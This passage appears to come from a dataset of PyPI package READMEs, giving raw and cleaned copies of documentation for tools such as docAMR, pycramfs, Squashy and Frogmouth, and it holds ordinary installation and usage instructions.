activate environment
```
pip install -r requirements.txt
```

# Create docAMR representation

Link to NAACL 2022 paper DOCAMR: Multi-Sentence AMR Representation and Evaluation

https://aclanthology.org/2022.naacl-main.256.pdf



To create docAMR representation from gold AMR3.0 data and the coref annotation in xml format:
```
python doc_amr.py 
--amr3-path  
--coref-fof  
--out-amr  
--rep 
```
`````` should point to uncompressed LDC data directory for LDC2020T02 with its original directory structure.

`````` is one of the ```_coref.fof``` files included in this repository.

Default value for ```--rep``` is ```'docAMR'```. Other values can be: ```'no-merge'```,```'merge-names'```,```'merge-all'```. Use ```--help``` to read the descriptions of these representations.

-------

To create docAMR representation from dcoument AMRs with no nodes merged
```
python doc_amr.py
       --in-doc-amr-unmerged 
       --rep 
       --out-amr 
```

-------

To create docAMR representation from dcoument AMRs with pairwise edges between a representative node in the chain and the rest of the nodes in the chain:
```
python doc_amr.py
       --in-doc-amr-pairwise 
       --pairwise-coref-rel 
       --rep 
       --out-amr 
```

default value for ```--pairwise-coref-rel``` is ```same-as```

# Evaluate docAMR (docSmatch) 

Use docSmatch the same way as the standard Smatch. 

```
python docSmatch/smatch.py -f  
```

It assumes that ```:snt``` relations connect sentences to the root. Moreover, it assumes that the numeric suffix of ```:snt``` is the sentence number and that the matching sentence numbers in the two AMRs are aligned.

You can also get a detailed score breakdown for the accuracy of coreference prediction:
```
python docSmatch/smatch.py -f   --coref-subscore
```
This will ouput the normal smatch score as 'Overall Score', as well as a 'Coref Score' indicating the quality of cross sentential edges and nodes.
",ibm/docamr
squashy,https://github.com/Minyall/squashy,4,903,903,"# ➡️Squashy⬅️

Large scale graph compression and summarization tool for research and analysis.

### Note on suitability for use
➡️Squashy⬅️ is relatively new. It was developed for one of my own academic research projects. The principles behind it are based on published research, however the implementation is my own. I think it works well, however it could do with more testing

## What does it do?

At some point the key tools of network analysis struggle with scale. Beyond a few hundred nodes, graphs become too dense
to visualise. Nodes too numerous to detect communities.

This can become even more of an issue in a research context, where you often want to run analysis multiple times, tweak
settings or actually _see_ your data.

➡️Squashy⬅️can compress graphs made up of millions of nodes and edges into a graph of a few hundred nodes that retains the overall structure.

## How does it work?

","# ➡️Squashy⬅️

Large scale graph compression and summarization tool for research and analysis.

### Note on suitability for use
➡️Squashy⬅️ is relatively new. It was developed for one of my own academic research projects. The principles behind it are based on published research, however the implementation is my own. I think it works well, however it could do with more testing

## What does it do?

At some point the key tools of network analysis struggle with scale. Beyond a few hundred nodes, graphs become too dense
to visualise. Nodes too numerous to detect communities.

This can become even more of an issue in a research context, where you often want to run analysis multiple times, tweak
settings or actually _see_ your data.

➡️Squashy⬅️can compress graphs made up of millions of nodes and edges into a graph of a few hundred nodes that retains the overall structure.

## How does it work?

",minyall/squashy
livesolid,https://github.com/pyscaffold/pyscaffold/,5,2084,2060,".. These are examples of badges you might want to add to your README:
   please update the URLs accordingly

    .. image:: https://api.cirrus-ci.com/github/<USER>/livesolid.svg?branch=main
        :alt: Built Status
        :target: https://cirrus-ci.com/github/<USER>/livesolid
    .. image:: https://readthedocs.org/projects/livesolid/badge/?version=latest
        :alt: ReadTheDocs
        :target: https://livesolid.readthedocs.io/en/stable/
    .. image:: https://img.shields.io/coveralls/github/<USER>/livesolid/main.svg
        :alt: Coveralls
        :target: https://coveralls.io/r/<USER>/livesolid
    .. image:: https://img.shields.io/pypi/v/livesolid.svg
        :alt: PyPI-Server
        :target: https://pypi.org/project/livesolid/
    .. image:: https://img.shields.io/conda/vn/conda-forge/livesolid.svg
        :alt: Conda-Forge
        :target: https://anaconda.org/conda-forge/livesolid
    .. image:: https://pepy.tech/badge/livesolid/month
        :alt: Monthly Downloads
        :target: https://pepy.tech/project/livesolid
    .. image:: https://img.shields.io/twitter/url/http/shields.io.svg?style=social&label=Twitter
        :alt: Twitter
        :target: https://twitter.com/livesolid

.. image:: https://img.shields.io/badge/-PyScaffold-005CA0?logo=pyscaffold
    :alt: Project generated with PyScaffold
    :target: https://pyscaffold.org/

|

=========
livesolid
=========


    Add a short description here!


A longer description of your project goes here...


.. _pyscaffold-notes:

Making Changes & Contributing
=============================

This project uses `pre-commit`_, please make sure to install it before making any
changes::

    pip install pre-commit
    cd livesolid
    pre-commit install

It is a good idea to update the hooks to the latest version::

    pre-commit autoupdate

Don't forget to tell your contributors to also install and use pre-commit.

.. _pre-commit: https://pre-commit.com/

Note
====

This project has been set up using PyScaffold 4.4. For details and usage
information on PyScaffold see https://pyscaffold.org/.
",".. These are examples of badges you might want to add to your README:
   please update the URLs accordingly

    .. image:: https://api.cirrus-ci.com/github//livesolid.svg?branch=main
        :alt: Built Status
        :target: https://cirrus-ci.com/github//livesolid
    .. image:: https://readthedocs.org/projects/livesolid/badge/?version=latest
        :alt: ReadTheDocs
        :target: https://livesolid.readthedocs.io/en/stable/
    .. image:: https://img.shields.io/coveralls/github//livesolid/main.svg
        :alt: Coveralls
        :target: https://coveralls.io/r//livesolid
    .. image:: https://img.shields.io/pypi/v/livesolid.svg
        :alt: PyPI-Server
        :target: https://pypi.org/project/livesolid/
    .. image:: https://img.shields.io/conda/vn/conda-forge/livesolid.svg
        :alt: Conda-Forge
        :target: https://anaconda.org/conda-forge/livesolid
    .. image:: https://pepy.tech/badge/livesolid/month
        :alt: Monthly Downloads
        :target: https://pepy.tech/project/livesolid
    .. image:: https://img.shields.io/twitter/url/http/shields.io.svg?style=social&label=Twitter
        :alt: Twitter
        :target: https://twitter.com/livesolid

.. image:: https://img.shields.io/badge/-PyScaffold-005CA0?logo=pyscaffold
    :alt: Project generated with PyScaffold
    :target: https://pyscaffold.org/

|

=========
livesolid
=========


    Add a short description here!


A longer description of your project goes here...


.. _pyscaffold-notes:

Making Changes & Contributing
=============================

This project uses `pre-commit`_, please make sure to install it before making any
changes::

    pip install pre-commit
    cd livesolid
    pre-commit install

It is a good idea to update the hooks to the latest version::

    pre-commit autoupdate

Don't forget to tell your contributors to also install and use pre-commit.

.. _pre-commit: https://pre-commit.com/

Note
====

This project has been set up using PyScaffold 4.4. For details and usage
information on PyScaffold see https://pyscaffold.org/.
",pyscaffold/pyscaffold
bw-temporalis,https://github.com/brightway-lca/bw_temporalis,14,1955,1935,"# bw_temporalis

[![PyPI](https://img.shields.io/pypi/v/bw_temporalis.svg)][pypi status]
[![Status](https://img.shields.io/pypi/status/bw_temporalis.svg)][pypi status]
[![Python Version](https://img.shields.io/pypi/pyversions/bw_temporalis)][pypi status]
[![License](https://img.shields.io/pypi/l/bw_temporalis)][license]

[![Read the documentation at https://bw_temporalis.readthedocs.io/](https://img.shields.io/readthedocs/bw_temporalis/latest.svg?label=Read%20the%20Docs)][read the docs]
[![Tests](https://github.com/brightway-lca/bw_temporalis/workflows/Tests/badge.svg)][tests]
[![Codecov](https://codecov.io/gh/brightway-lca/bw_temporalis/branch/main/graph/badge.svg)][codecov]

[![pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white)][pre-commit]
[![Black](https://img.shields.io/badge/code%20style-black-000000.svg)][black]

[pypi status]: https://pypi.org/project/bw_temporalis/
[read the docs]: https://bw_temporalis.readthedocs.io/
[tests]: https://github.com/brightway-lca/bw_temporalis/actions?workflow=Tests
[codecov]: https://app.codecov.io/gh/brightway-lca/bw_temporalis
[pre-commit]: https://github.com/pre-commit/pre-commit
[black]: https://github.com/psf/black

## Installation

You can install _bw_temporalis_ via [pip] from [PyPI]:

```console
$ pip install bw_temporalis
```

## Contributing

Contributions are very welcome.
To learn more, see the [Contributor Guide].

## License

Distributed under the terms of the [BSD 3 Clause license][license],
_bw_temporalis_ is free and open source software.

## Issues

If you encounter any problems,
please [file an issue] along with a detailed description.


<!-- github-only -->

[command-line reference]: https://bw_temporalis.readthedocs.io/en/latest/usage.html
[license]: https://github.com/brightway-lca/bw_temporalis/blob/main/LICENSE
[contributor guide]: https://github.com/brightway-lca/bw_temporalis/blob/main/CONTRIBUTING.md
","# bw_temporalis

[![PyPI](https://img.shields.io/pypi/v/bw_temporalis.svg)][pypi status]
[![Status](https://img.shields.io/pypi/status/bw_temporalis.svg)][pypi status]
[![Python Version](https://img.shields.io/pypi/pyversions/bw_temporalis)][pypi status]
[![License](https://img.shields.io/pypi/l/bw_temporalis)][license]

[![Read the documentation at https://bw_temporalis.readthedocs.io/](https://img.shields.io/readthedocs/bw_temporalis/latest.svg?label=Read%20the%20Docs)][read the docs]
[![Tests](https://github.com/brightway-lca/bw_temporalis/workflows/Tests/badge.svg)][tests]
[![Codecov](https://codecov.io/gh/brightway-lca/bw_temporalis/branch/main/graph/badge.svg)][codecov]

[![pre-commit](https://img.shields.io/badge/pre--commit-enabled-brightgreen?logo=pre-commit&logoColor=white)][pre-commit]
[![Black](https://img.shields.io/badge/code%20style-black-000000.svg)][black]

[pypi status]: https://pypi.org/project/bw_temporalis/
[read the docs]: https://bw_temporalis.readthedocs.io/
[tests]: https://github.com/brightway-lca/bw_temporalis/actions?workflow=Tests
[codecov]: https://app.codecov.io/gh/brightway-lca/bw_temporalis
[pre-commit]: https://github.com/pre-commit/pre-commit
[black]: https://github.com/psf/black

## Installation

You can install _bw_temporalis_ via [pip] from [PyPI]:

```console
$ pip install bw_temporalis
```

## Contributing

Contributions are very welcome.
To learn more, see the [Contributor Guide].

## License

Distributed under the terms of the [BSD 3 Clause license][license],
_bw_temporalis_ is free and open source software.

## Issues

If you encounter any problems,
please [file an issue] along with a detailed description.




[command-line reference]: https://bw_temporalis.readthedocs.io/en/latest/usage.html
[license]: https://github.com/brightway-lca/bw_temporalis/blob/main/LICENSE
[contributor guide]: https://github.com/brightway-lca/bw_temporalis/blob/main/CONTRIBUTING.md
",brightway-lca/bw_temporalis
meural-photo-prep,https://github.com/ironScripter/meural-photo-prep/,1,2296,2241,"# Netgear Meural Photo Preparation
Python Package to prepare photos for use with Netgear Meural Picture Frames. \
__This package is not affiliated with Netgear in any way.__ \
Netgear Meural Picture Frames require photos to be formatted in a specific way. \
This package will prepare photos for use with Netgear Meural Picture Frames. \
For more information on the Netgear Meural Picture Frames formatting need please visit
[Netgear](https://kb.netgear.com/000064426/How-do-I-add-images-or-videos-to-a-memory-card-for-my-Meural)
## Table of Contents
* [External Dependencies](#external-dependencies)
* [Installation](#installation)
* [Usage](#usage)

## External Dependencies
* [Pillow](https://pillow.readthedocs.io/en/stable/)
## Installation
### Requirements
* Python 3.9+

### PIP
```bash
pip install meural-photo-prep
```
### Poetry
```yaml
[tool.poetry]
name = ""example-package""
version = ""0.1.0""
description = """"
authors = [""Example developer <dev@example.com>""]
readme = ""README.md""

[tool.poetry.dependencies]
python = ""^3.9""
meural-photo-prep = ""^1.0.1""

[build-system]
requires = [""poetry-core""]
build-backend = ""poetry.core.masonry.api""
```

## Usage
### Description
* Prepares photos for use with Netgear Meural Picture Frames.
* Copies photos from the input path to the output path. 
  * Removes special characters from the file name.
* Creates a thumbnail for each photo using the 
[Thumbnail()](https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.thumbnail) 
method from Pillow.
  * The thumbnail is created using the dimensions specified in the documentation above.
  * The thumbnail is saved with the same name as the original photo with the addition of the .thumb extension.
* Function uses threading to process photos in parallel. 
  * **__NOTE: This may cause issues with memory usage as thread limits are not implemented in this version \
  be careful how many photos you give it!__**
### Example
```python
import meural_photo_prep as mpp

mpp.prep_photos(""<INPUT_PATH>"", ""<OUTPUT_PATH>"")
```
#### Output
```bash
<OUTPUT_PATH>
|__ meural1
    |__ img1.jpg # All names have special characters removed
    |__ img1.jpg.thumb # Rendered by Pillow using Thumbnail() method
    |__ img2.jpg
    |__ img2.jpg.thumb
    |__ img3.jpg
    |__ img3.jpg.thumb
","# Netgear Meural Photo Preparation
Python Package to prepare photos for use with Netgear Meural Picture Frames. \
__This package is not affiliated with Netgear in any way.__ \
Netgear Meural Picture Frames require photos to be formatted in a specific way. \
This package will prepare photos for use with Netgear Meural Picture Frames. \
For more information on the Netgear Meural Picture Frames formatting need please visit
[Netgear](https://kb.netgear.com/000064426/How-do-I-add-images-or-videos-to-a-memory-card-for-my-Meural)
## Table of Contents
* [External Dependencies](#external-dependencies)
* [Installation](#installation)
* [Usage](#usage)

## External Dependencies
* [Pillow](https://pillow.readthedocs.io/en/stable/)
## Installation
### Requirements
* Python 3.9+

### PIP
```bash
pip install meural-photo-prep
```
### Poetry
```yaml
[tool.poetry]
name = ""example-package""
version = ""0.1.0""
description = """"
authors = [""Example developer ""]
readme = ""README.md""

[tool.poetry.dependencies]
python = ""^3.9""
meural-photo-prep = ""^1.0.1""

[build-system]
requires = [""poetry-core""]
build-backend = ""poetry.core.masonry.api""
```

## Usage
### Description
* Prepares photos for use with Netgear Meural Picture Frames.
* Copies photos from the input path to the output path. 
  * Removes special characters from the file name.
* Creates a thumbnail for each photo using the 
[Thumbnail()](https://pillow.readthedocs.io/en/stable/reference/Image.html#PIL.Image.Image.thumbnail) 
method from Pillow.
  * The thumbnail is created using the dimensions specified in the documentation above.
  * The thumbnail is saved with the same name as the original photo with the addition of the .thumb extension.
* Function uses threading to process photos in parallel. 
  * **__NOTE: This may cause issues with memory usage as thread limits are not implemented in this version \
  be careful how many photos you give it!__**
### Example
```python
import meural_photo_prep as mpp

mpp.prep_photos("""", """")
```
#### Output
```bash

|__ meural1
    |__ img1.jpg # All names have special characters removed
    |__ img1.jpg.thumb # Rendered by Pillow using Thumbnail() method
    |__ img2.jpg
    |__ img2.jpg.thumb
    |__ img3.jpg
    |__ img3.jpg.thumb
",ironscripter/meural-photo-prep
starrail,https://github.com/ReZeroE/StarRail,0,361,361,"# Honkai Star Rail - `starrail`

**Note: This package is currently under development.**

Honkai: Star Rail Automation Package (auto-resource grinder).

## Installation / Setup
The install the `starrail` package, run:
```shell
pip install starrail
```
OR
```shell
git clone https://github.com/ReZeroE/StarRail.git
cd StarRail/
pip install .
```
","# Honkai Star Rail - `starrail`

**Note: This package is currently under development.**

Honkai: Star Rail Automation Package (auto-resource grinder).

## Installation / Setup
The install the `starrail` package, run:
```shell
pip install starrail
```
OR
```shell
git clone https://github.com/ReZeroE/StarRail.git
cd StarRail/
pip install .
```
",rezeroe/starrail
swedish-market-insights,https://github.com/fritjof-b/swedish-market-insights,2,1301,1273,"# Swedish Market Insights

SMI is a small package for fetching inside trades made in Sweden.
The data is collected with `requests` and parsed with `BeautifulSoup4`.
All data is publicly available on Finansinspektionen's [website](https://fi.se/).

## Installation

<!-- `pip install insyn` -->

## Usage

```python3
from swedish_market_insights import ficlient

api = ficlient.FiClient()
recent_inside_trades = api.get_trades_by_transaction_date()
```

## Features

- Fetch inside trades by transaction date
- Fetch inside trades by publication date

## Examples

### Fetch inside trades by transaction date

```python3
from swedish_market_insights import ficlient
from datetime import date

api = ficlient.FiClient()
trades = api.get_trades_by_transaction_date(
    from_date=date(2020, 1, 1),
    to_date=date(2020, 1, 31))
```

### Fetch inside trades by publication date

```python3
from datetime import date
from swedish_market_insights import ficlient

api = ficlient.FiClient()
trades = api.get_trades_by_publish_date(
    from_date=date(2022, 10, 8),
    to_date=date(2022, 10, 10))
```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request on GitHub if you have any suggestions or
improvements.

## License

This project is licensed under the MIT License.","# Swedish Market Insights

SMI is a small package for fetching inside trades made in Sweden.
The data is collected with `requests` and parsed with `BeautifulSoup4`.
All data is publicly available on Finansinspektionen's [website](https://fi.se/).

## Installation



## Usage

```python3
from swedish_market_insights import ficlient

api = ficlient.FiClient()
recent_inside_trades = api.get_trades_by_transaction_date()
```

## Features

- Fetch inside trades by transaction date
- Fetch inside trades by publication date

## Examples

### Fetch inside trades by transaction date

```python3
from swedish_market_insights import ficlient
from datetime import date

api = ficlient.FiClient()
trades = api.get_trades_by_transaction_date(
    from_date=date(2020, 1, 1),
    to_date=date(2020, 1, 31))
```

### Fetch inside trades by publication date

```python3
from datetime import date
from swedish_market_insights import ficlient

api = ficlient.FiClient()
trades = api.get_trades_by_publish_date(
    from_date=date(2022, 10, 8),
    to_date=date(2022, 10, 10))
```

## Contributing

Contributions are welcome! Please open an issue or submit a pull request on GitHub if you have any suggestions or
improvements.

## License

This project is licensed under the MIT License.",fritjof-b/swedish-market-insights
pycramfs,https://github.com/AT0myks/pycramfs,0,7804,7408,"# pycramfs

<p align=""left"">
<a><img alt=""Python versions"" src=""https://img.shields.io/pypi/pyversions/pycramfs""></a>
<a href=""https://pypi.org/project/pycramfs/""><img alt=""PyPI"" src=""https://img.shields.io/pypi/v/pycramfs""></a>
<a href=""https://github.com/AT0myks/pycramfs/blob/main/LICENSE""><img alt=""License"" src=""https://img.shields.io/pypi/l/pycramfs""></a>
</p>

* [Requirements](#requirements)
* [Installation](#installation)
* [Usage](#usage)
* [References](#references)

A library and tool to read and extract cramfs images.

It is far from being as complete as the tools it's based on,
but should be enough for simple images.
For example, as of right now it only supports contiguous data layout.
Only little endian images are supported.

It also provides ways to extract data from an image,
although you might prefer using
[`cramfsck`](https://github.com/npitre/cramfs-tools)
on Linux and 7-Zip on Windows for better compatibility.

## Requirements

Python 3.8+.

## Installation

```
pip install pycramfs
```

## Usage

### API

Here's an overview of what you can do:
```py
from pycramfs import Cramfs
from pycramfs.extract import extract_dir, extract_file
from pycramfs.util import find_superblocks

fsimage = ""cramfs.bin""
superblocks = find_superblocks(fsimage)

with Cramfs.from_file(fsimage, offset=superblocks[0][""offset""]) as cramfs:
    # Optional offset for start of file system.
    # You can also create Cramfs instances from bytes or a file descriptor.

    sblock = cramfs.super  # Access the file system's superblock
    print(sblock.name)
    print(dict(sblock))  # Superblock as a dictionary
    assert cramfs.calculate_crc() == sblock.fsid.crc

    rootdir = cramfs.rootdir  # root directory
    print(cramfs.size)  # File system size in bytes (shortcut to sblock.size)
    # Number of files in the whole file system (shortcut to sblock.fsid.files).
    print(len(cramfs))
    print(""/etc/passwd"" in cramfs)  # Check if path exists

    # Iterate over the whole file system.
    for file in cramfs:
        print(file.parent)  # Instance of Directory (None for the root directory)
        print(file in cramfs)  # Check if file belongs to this image
        if file.is_symlink:  # Check the file's type
            print(file.readlink())  # Symlink target

    etc = cramfs.select(""/etc"")  # Select a specific file or directory
    etc = cramfs.select(""etc"")  # Can also be a relative path
    rootdir = etc.select("".."")  # And a special entry
    assert rootdir == rootdir.select('.')
    print(etc)  # print the file or directory's name
    # The file or directory's absolute path (an instance of PurePosixPath).
    print(etc.path)
    print(etc.files)  # A dictionary mapping file names to File instances
    print(len(etc))  # Number of entries in the directory (shortcut to len(etc.files))
    print(etc.total)  # Number of entries in this whole subtree
    # A list of this directory's children (shortcut to list(etc.files.values())).
    print(list(etc))

    # Find the first file in this subtree that has this name.
    passwd = cramfs.find(""passwd"")
    # Return the child entry if present else raise KeyError (shortcut to etc.files[""passwd""]).
    passwd = etc[""passwd""]
    print(""passwd"" in etc)  # Check if directory contains this file
    print(passwd in etc)  # Also works with instances of File

    # Iterate over this directory's files.
    for file in etc:
        print(file.inode)  # Access inode information
        # These attributes are shortcuts to file.inode.<attr>
        print(file.mode)
        print(file.uid)
        print(file.size)
        print(file.gid)

    # Iterate over this whole subtree.
    for file in etc.riter():
        print(file.name)  # File name, equivalent to file.path.name
        print(file.filemode)  # File mode as a string, for example drwxrwxrwx
    
    # Iterate over files in the subtree that match a pattern.
    for config_file in etc.itermatch(""*.conf""):
        print(config_file.read_bytes())  # Read the file's raw content
        print(config_file.read_text(""utf8""))  # Or as a string with optional encoding

    assert etc > cramfs.select(""/bin"")  # Comparing instances of File compares their name

    # You can use absolute paths from any directory.
    cramfs.select(""/my/dir/over/here"").select(""/bin"")  # Selects /bin
    cramfs.select(""/my/dir/over/here"").select(""bin"")  # Selects /my/dir/over/here/bin

    # Calling find(), select() and itermatch() on cramfs
    # is the same as calling them on cramfs.rootdir.

    extract_dir(etc, ""extract/etc"")  # Extract a directory tree
    extract_file(passwd, ""extract/passwd"")  # Extract a single file
```

### Command line

pycramfs comes with a command-line interface that consists of 4 sub-commands.

#### Info

```
usage: pycramfs info [-h] file

Show information about all the superblocks that can be found in a file

positional arguments:
  file
```

Example output:
```
$ pycramfs info cramfs.bin
Superblock #1
Magic:     0x28CD3D45
Size:      282,624
Flags:     <Flag.SORTED_DIRS|FSID_VERSION_2: 3>
Future:    0
Signature: Compressed ROMFS
Name:      Compressed
CRC:       0xDEADBEEF
Edition:   0
Blocks:    6,926
Files:     420
Offset:    8157
```

#### List

```
usage: pycramfs list [-h] [-o OFFSET] [-p PATTERN] [-t TYPE [TYPE ...]] file

List the contents of the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET      absolute position of file system's start. Default: 0
  -p PATTERN, --pattern PATTERN   filter by file name pattern with fnmatch
  -t TYPE [TYPE ...], --type TYPE [TYPE ...]
                                  filter by file type with f, d, l, p, s, b, c
```

Example that lists only directories and symlinks that match a pattern:
```
$ pycramfs list cramfs.bin -t d l -p ""*bin*""
drwxrwxr-x      256   123:0   /bin 
lrwxrwxrwx        7   123:0   /bin/ash -> busybox
lrwxrwxrwx        7   123:0   /bin/base64 -> busybox
3 file(s) found
```

#### Extract

```
usage: pycramfs extract [-h] [-o OFFSET] [-d DEST] [-p PATH] [-f] [-q] file

Extract files from the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET   absolute position of file system's start. Default: 0
  -d DEST, --dest DEST         destination directory. Default: next to file
  -p PATH, --path PATH         absolute path of directory or file to extract. Default: '/'
  -f, --force                  overwrite files that already exist. Default: False
  -q, --quiet                  don't print extraction status. Default: False
```

On Linux, just like `cramfsck -x` you need to run as root
if you want to preserve file mode, owner and group.

On Windows, the only reason to run as a privileged user is to be able to create
symlinks.
Unprivileged accounts can create symlinks if Developer Mode is enabled.
Otherwise, a regular file containing the target will be created.
Special files will always just be empty files.

#### Check

This command is similar to running `cramfsck -c file` but is not as thorough.

```
usage: pycramfs check [-h] [-o OFFSET] file

Make a few superficial checks of the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET   absolute position of file system's start. Default: 0
```

## References

- [cramfs readme](https://github.com/torvalds/linux/blob/master/fs/cramfs/README)
- [cramfs_fs.h](https://github.com/npitre/cramfs-tools/blob/master/linux/cramfs_fs.h)
- [cramfsck.c](https://github.com/npitre/cramfs-tools/blob/master/cramfsck.c)
- [mkcramfs.c](https://github.com/npitre/cramfs-tools/blob/master/mkcramfs.c)
","# pycramfs







* [Requirements](#requirements)
* [Installation](#installation)
* [Usage](#usage)
* [References](#references)

A library and tool to read and extract cramfs images.

It is far from being as complete as the tools it's based on,
but should be enough for simple images.
For example, as of right now it only supports contiguous data layout.
Only little endian images are supported.

It also provides ways to extract data from an image,
although you might prefer using
[`cramfsck`](https://github.com/npitre/cramfs-tools)
on Linux and 7-Zip on Windows for better compatibility.

## Requirements

Python 3.8+.

## Installation

```
pip install pycramfs
```

## Usage

### API

Here's an overview of what you can do:
```py
from pycramfs import Cramfs
from pycramfs.extract import extract_dir, extract_file
from pycramfs.util import find_superblocks

fsimage = ""cramfs.bin""
superblocks = find_superblocks(fsimage)

with Cramfs.from_file(fsimage, offset=superblocks[0][""offset""]) as cramfs:
    # Optional offset for start of file system.
    # You can also create Cramfs instances from bytes or a file descriptor.

    sblock = cramfs.super  # Access the file system's superblock
    print(sblock.name)
    print(dict(sblock))  # Superblock as a dictionary
    assert cramfs.calculate_crc() == sblock.fsid.crc

    rootdir = cramfs.rootdir  # root directory
    print(cramfs.size)  # File system size in bytes (shortcut to sblock.size)
    # Number of files in the whole file system (shortcut to sblock.fsid.files).
    print(len(cramfs))
    print(""/etc/passwd"" in cramfs)  # Check if path exists

    # Iterate over the whole file system.
    for file in cramfs:
        print(file.parent)  # Instance of Directory (None for the root directory)
        print(file in cramfs)  # Check if file belongs to this image
        if file.is_symlink:  # Check the file's type
            print(file.readlink())  # Symlink target

    etc = cramfs.select(""/etc"")  # Select a specific file or directory
    etc = cramfs.select(""etc"")  # Can also be a relative path
    rootdir = etc.select("".."")  # And a special entry
    assert rootdir == rootdir.select('.')
    print(etc)  # print the file or directory's name
    # The file or directory's absolute path (an instance of PurePosixPath).
    print(etc.path)
    print(etc.files)  # A dictionary mapping file names to File instances
    print(len(etc))  # Number of entries in the directory (shortcut to len(etc.files))
    print(etc.total)  # Number of entries in this whole subtree
    # A list of this directory's children (shortcut to list(etc.files.values())).
    print(list(etc))

    # Find the first file in this subtree that has this name.
    passwd = cramfs.find(""passwd"")
    # Return the child entry if present else raise KeyError (shortcut to etc.files[""passwd""]).
    passwd = etc[""passwd""]
    print(""passwd"" in etc)  # Check if directory contains this file
    print(passwd in etc)  # Also works with instances of File

    # Iterate over this directory's files.
    for file in etc:
        print(file.inode)  # Access inode information
        # These attributes are shortcuts to file.inode.
        print(file.mode)
        print(file.uid)
        print(file.size)
        print(file.gid)

    # Iterate over this whole subtree.
    for file in etc.riter():
        print(file.name)  # File name, equivalent to file.path.name
        print(file.filemode)  # File mode as a string, for example drwxrwxrwx
    
    # Iterate over files in the subtree that match a pattern.
    for config_file in etc.itermatch(""*.conf""):
        print(config_file.read_bytes())  # Read the file's raw content
        print(config_file.read_text(""utf8""))  # Or as a string with optional encoding

    assert etc > cramfs.select(""/bin"")  # Comparing instances of File compares their name

    # You can use absolute paths from any directory.
    cramfs.select(""/my/dir/over/here"").select(""/bin"")  # Selects /bin
    cramfs.select(""/my/dir/over/here"").select(""bin"")  # Selects /my/dir/over/here/bin

    # Calling find(), select() and itermatch() on cramfs
    # is the same as calling them on cramfs.rootdir.

    extract_dir(etc, ""extract/etc"")  # Extract a directory tree
    extract_file(passwd, ""extract/passwd"")  # Extract a single file
```

### Command line

pycramfs comes with a command-line interface that consists of 4 sub-commands.

#### Info

```
usage: pycramfs info [-h] file

Show information about all the superblocks that can be found in a file

positional arguments:
  file
```

Example output:
```
$ pycramfs info cramfs.bin
Superblock #1
Magic:     0x28CD3D45
Size:      282,624
Flags:     
Future:    0
Signature: Compressed ROMFS
Name:      Compressed
CRC:       0xDEADBEEF
Edition:   0
Blocks:    6,926
Files:     420
Offset:    8157
```

#### List

```
usage: pycramfs list [-h] [-o OFFSET] [-p PATTERN] [-t TYPE [TYPE ...]] file

List the contents of the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET      absolute position of file system's start. Default: 0
  -p PATTERN, --pattern PATTERN   filter by file name pattern with fnmatch
  -t TYPE [TYPE ...], --type TYPE [TYPE ...]
                                  filter by file type with f, d, l, p, s, b, c
```

Example that lists only directories and symlinks that match a pattern:
```
$ pycramfs list cramfs.bin -t d l -p ""*bin*""
drwxrwxr-x      256   123:0   /bin 
lrwxrwxrwx        7   123:0   /bin/ash -> busybox
lrwxrwxrwx        7   123:0   /bin/base64 -> busybox
3 file(s) found
```

#### Extract

```
usage: pycramfs extract [-h] [-o OFFSET] [-d DEST] [-p PATH] [-f] [-q] file

Extract files from the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET   absolute position of file system's start. Default: 0
  -d DEST, --dest DEST         destination directory. Default: next to file
  -p PATH, --path PATH         absolute path of directory or file to extract. Default: '/'
  -f, --force                  overwrite files that already exist. Default: False
  -q, --quiet                  don't print extraction status. Default: False
```

On Linux, just like `cramfsck -x` you need to run as root
if you want to preserve file mode, owner and group.

On Windows, the only reason to run as a privileged user is to be able to create
symlinks.
Unprivileged accounts can create symlinks if Developer Mode is enabled.
Otherwise, a regular file containing the target will be created.
Special files will always just be empty files.

#### Check

This command is similar to running `cramfsck -c file` but is not as thorough.

```
usage: pycramfs check [-h] [-o OFFSET] file

Make a few superficial checks of the file system

positional arguments:
  file

options:
  -o OFFSET, --offset OFFSET   absolute position of file system's start. Default: 0
```

## References

- [cramfs readme](https://github.com/torvalds/linux/blob/master/fs/cramfs/README)
- [cramfs_fs.h](https://github.com/npitre/cramfs-tools/blob/master/linux/cramfs_fs.h)
- [cramfsck.c](https://github.com/npitre/cramfs-tools/blob/master/cramfsck.c)
- [mkcramfs.c](https://github.com/npitre/cramfs-tools/blob/master/mkcramfs.c)
",at0myks/pycramfs
frogmouth,https://github.com/Textualize/frogmouth,4,2740,1725,"
<p align=""center"">
  <img src=""https://user-images.githubusercontent.com/554369/234892488-856f9da7-7b82-4429-ac35-0d0545bf0d24.png""  width=""300"" align=""center""/>
</p>

[![Discord](https://img.shields.io/discord/1026214085173461072)](https://discord.gg/Enf6Z3qhVr)



# Frogmouth


Frogmouth is a terminal-based Markdown viewer / browser, built with [Textual](https://github.com/Textualize/textual).

Frogmouth can view `*.md` locally or via a URL.
There is a familiar browser-like navigation stack, history, bookmarks, and table of contents.

<details>  
  <summary> 🎬 Demonstration </summary>
  <hr>

A quick video tour of Frogmouth.




https://user-images.githubusercontent.com/554369/235305502-2699a70e-c9a6-495e-990e-67606d84bbfa.mp4

(thanks [Screen Studio](https://www.screen.studio/))


</details>

## Screenshots

<table>

<tr>
<td>
<img width=""100%"" align=""left"" alt=""Screenshot 2023-04-28 at 15 14 53"" src=""https://user-images.githubusercontent.com/554369/235172015-555565a0-3df0-4e5d-b621-23e84fec82a3.png"">
</td>

<td>
<img width=""100%"" align=""right"" alt=""Screenshot 2023-04-28 at 15 17 56"" src=""https://user-images.githubusercontent.com/554369/235172990-54460daf-baf4-4e02-aa22-9cec58d15315.png"">
</td>
</tr>

<tr>

<td>
<img width=""100%"" alt=""Screenshot 2023-04-28 at 15 18 36"" src=""https://user-images.githubusercontent.com/554369/235173115-012e35fa-d737-4794-a696-0d5cb0b68490.png"">
</td>

<td>
<img width=""100%"" alt=""Screenshot 2023-04-28 at 15 16 39"" src=""https://user-images.githubusercontent.com/554369/235173418-58c23583-3fb3-4ff1-a723-10fa607cdd48.png"">
</td>

</tr>

</table>


## Compatibility

Frogmouth runs on Linux, macOS, and Windows. Frogmouth requires Python **3.8** or above.
